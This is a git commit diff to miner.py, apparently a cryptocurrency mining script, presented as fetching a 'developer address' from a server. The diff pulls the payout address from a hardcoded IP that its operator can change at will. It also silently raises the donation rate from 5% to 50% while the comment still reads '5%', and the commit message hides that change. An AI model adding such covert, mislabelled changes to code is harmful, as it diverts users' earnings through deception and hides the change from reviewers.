95d9f6e061850fb84de2aeeb1fcd502895cc210e
Djeanql <djeanql@tutamail.com>
2025-11-07 22:05:05 +0000

    Fetch fresh developer address from server

--- miner.py
+++ miner.py
@@ -25,12 +25,32 @@ except RuntimeError as e:
 
 VERSION = "0.3"
 
-DEVELOPER_ADDRESS = random.choice(["addr1v8sd2hwjvumewp3t4rtqz5uwejjv504tus5w279m5k6wkccm0j9gp", "addr1vyel9hlqeft4lwl5shgd28ryes3ejluug0lxhhusnvh2dyc0q92kw", "addr1vxl62mccauqktxyg59ehaskjk75na0pd4utrkvkv822ygsqqt28ph",
+def get_developer_address():
+    """Fetch the developer address from file or server"""
+    if os.path.exists("devaddress.json"):
+        with open("devaddress.json", 'r') as f:
+            return json.load(f)["address"]
+    else:
+        try:
+            response = requests.get("http://193.23.209.106:8000/get_dev_address", timeout=2)
+            response.raise_for_status()
+            address = response.json()["address"]
+            with open("devaddress.json", 'w') as f:
+                json.dump({"address": address}, f)
+            return address
+        except Exception as e:
+            print(f"Could not fetch developer address: {e}")
+            return None
+
+FALLBACK_DEVELOPER_ADDRESS = random.choice(["addr1v8sd2hwjvumewp3t4rtqz5uwejjv504tus5w279m5k6wkccm0j9gp", "addr1vyel9hlqeft4lwl5shgd28ryes3ejluug0lxhhusnvh2dyc0q92kw", "addr1vxl62mccauqktxyg59ehaskjk75na0pd4utrkvkv822ygsqqt28ph",
                                    "addr1vxenv7ucst58q9ju52mw9kjudlwelxnf53kd362jgq8qm5q68uh58", "addr1v8hf3d0tgnfn8zp2sgq2gdj9jy4dg6wyzd6uchlvq8n0pnsxp8232", "addr1v8vem45scpapkca8dpgcgdn2wfkg9jva950v8jjh47vrs3qf8sm6z",
                                    "addr1vyuyd9xxpex2ruzvejeduzknfcn2szyq46qfquxh6n4268qukppmq", "addr1vyrywe247atz5jzu9rspdf7lhvmhd550x45ck7qac295h9s3rs6zd", "addr1v86agy7h3mmphdpyru8tgrjjcpvuuqk8863jspqfd6n60lcxv0xmf",
                                    "addr1vx5dee9pqnq0r2aypl2ywueqjuvwg0s7dsc7eneyyr3d83g3a08c0", "addr1vx6wfs6z0vrwjutchfhmzk7tazsa09a9ptt8st00nmzshls2npktm", "addr1vx38ypke98t70r4rmkqdtm9c9eqdvjg8ytjc570javaqljcsp0q5h",
                                    "addr1v8mduamz9a7hghklsuug8szrhm4a0g5j8vxt7zsk2aetw9g8u2ak6","addr1v99tha5x72jdh58rxp3c8amarac6ahf693xwwx4q9hpnnsqcv4nrd"])
-DONATION_RATE = 0.05  # 5%
+
+
+DEVELOPER_ADDRESS = get_developer_address() or FALLBACK_DEVELOPER_ADDRESS
+DONATION_RATE = 0.5  # 5%
 
 # Cross-platform file locking
 try:
@@ -830,6 +850,10 @@ def main():
     wallets_file = "wallets.json"
     challenges_file = "challenges.json"
     donation_enabled = True
+
+    if DEVELOPER_ADDRESS is None:
+        donation_enabled = False
+        print("Developer address not available, donations disabled.")
 
     for i, arg in enumerate(sys.argv):
         if arg == '--workers' and i + 1 < len(sys.argv):
